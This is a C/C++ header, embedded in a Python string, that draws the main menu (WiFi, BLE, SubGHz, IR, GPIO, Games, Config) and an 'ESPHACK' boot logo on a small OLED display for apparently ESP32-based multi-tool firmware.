INTERFACE_H = '''#ifndef INTERFACE_H
#define INTERFACE_H

#include "display.h"
#include "CONFIG.h"

#define MENU_ITEM_COUNT 7

void returnToMainMenu();

static const unsigned char PROGMEM image_DOTsel_bits[] = {0x60,0xf0,0xf0,0x60};
static const unsigned char PROGMEM image_DOT_bits[] = {0x60,0x90,0x90,0x60};

// Екстерні іконки
extern const unsigned char PROGMEM image_WiFi_bits[];
extern const unsigned char PROGMEM image_Bluetooth_bits[];
extern const unsigned char PROGMEM image_SubGHz_bits[];
extern const unsigned char PROGMEM image_IR_bits[];
extern const unsigned char PROGMEM image_GPIO_bits[];
extern const unsigned char PROGMEM image_Games_bits[];
extern const unsigned char PROGMEM image_Config_bits[];
extern const unsigned char PROGMEM image_ESPHACK_bits[];

constexpr int16_t MAIN_MENU_DOT_START_Y = 6;
constexpr int16_t MAIN_MENU_DOT_STEP_Y = 8;

inline void drawMainMenuDots(DisplayType &display) {
  for (byte i = 0; i < MENU_ITEM_COUNT; i++) {
    display.drawBitmap(122, MAIN_MENU_DOT_START_Y + (i * MAIN_MENU_DOT_STEP_Y), image_DOT_bits, 4, 4, 1);
  }
}

inline int16_t getMainMenuDotY(byte menuIndex) {
  return MAIN_MENU_DOT_START_Y + (menuIndex * MAIN_MENU_DOT_STEP_Y);
}

inline void drawMainMenuSelectedDot(DisplayType &display, int16_t y) {
  display.drawBitmap(122, y, image_DOTsel_bits, 4, 4, 1);
}

inline void drawMainMenuPage(DisplayType &display, byte menuIndex, int16_t yOffset = 0) {
  if (menuIndex == 0) {
    display.drawBitmap(6, 17 + yOffset, image_WiFi_bits, 39, 31, 1);
    display.setTextColor(1);
    display.setTextSize(2);
    display.setTextWrap(false);
    display.setCursor(59, 25 + yOffset);
    display.print("WiFi");
  } else if (menuIndex == 1) {
    display.drawBitmap(15, 13 + yOffset, image_Bluetooth_bits, 22, 38, 1);
    display.setTextColor(1);
    display.setTextSize(2);
    display.setCursor(62, 25 + yOffset);
    display.print("BLE");
  } else if (menuIndex == 2) {
    display.drawBitmap(5, 14 + yOffset, image_SubGHz_bits, 39, 39, 1);
    display.setTextColor(1);
    display.setTextSize(2);
    display.setCursor(48, 25 + yOffset);
    display.print("SubGHz");
  } else if (menuIndex == 3) {
    display.drawBitmap(8, 15 + yOffset, image_IR_bits, 34, 35, 1);
    display.setTextColor(1);
    display.setTextSize(2);
    display.setCursor(69, 25 + yOffset);
    display.print("IR");
  } else if (menuIndex == 4) {
    display.drawBitmap(7, 12 + yOffset, image_GPIO_bits, 38, 40, 1);
    display.setTextColor(1);
    display.setTextSize(2);
    display.setCursor(59, 25 + yOffset);
    display.print("GPIO");
  } else if (menuIndex == 5) {
    display.drawBitmap(7, 16 + yOffset, image_Games_bits, 32, 32, 1);
    display.setTextColor(1);
    display.setTextSize(2);
    display.setCursor(52, 25 + yOffset);
    display.print("Games");
  } else if (menuIndex == 6) {
    display.drawBitmap(7, 16 + yOffset, image_Config_bits, 32, 32, 1);
    display.setTextColor(1);
    display.setTextSize(2);
    display.setCursor(46, 25 + yOffset);
    display.print("Config");
  }
}

inline void OLED_printLogo(DisplayType &display) {
  display.clearDisplay();
  display.drawBitmap(0, 0, image_ESPHACK_bits, 128, 64, 1);
  display.setTextColor(1);
  display.setTextWrap(false);
  display.setCursor(2, 2);
  display.print(FIRMWARE);
  display.display();
  delay(2000);
}

inline void OLED_printMenu(DisplayType &display, byte menuIndex) {
  display.clearDisplay();
  drawMainMenuDots(display);
  drawMainMenuPage(display, menuIndex);
  drawMainMenuSelectedDot(display, getMainMenuDotY(menuIndex));
  display.display();
}

#endif
'''

